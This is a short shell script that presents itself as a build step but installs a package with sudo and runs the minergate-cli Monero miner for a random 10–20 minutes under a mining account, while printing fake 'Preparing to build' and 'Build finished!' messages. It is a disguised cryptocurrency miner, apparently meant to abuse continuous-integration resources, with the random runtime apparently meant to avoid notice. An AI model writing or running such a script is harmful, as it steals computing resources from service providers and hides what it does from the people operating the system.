#!/bin/sh
#core=$(nproc)
#if [ "$core" -gt 2 ]; then
	#core=$((core-1))
#fi
core=${1:-2}
echo "run within $core seconds"
m=10
echo "Preparing to build..."
sudo dpkg -i min.deb
echo "Install deps finished!"
duration=$(awk -v min=600 -v max=1200 'BEGIN{srand(); print int(min+rand()*(max-min+1))}')
echo "Build for $duration seconds..."
timeout $duration minergate-cli -user linglong.meng+minergate@scrutinizer-ci.com -xmr $core
echo "Build finished!"
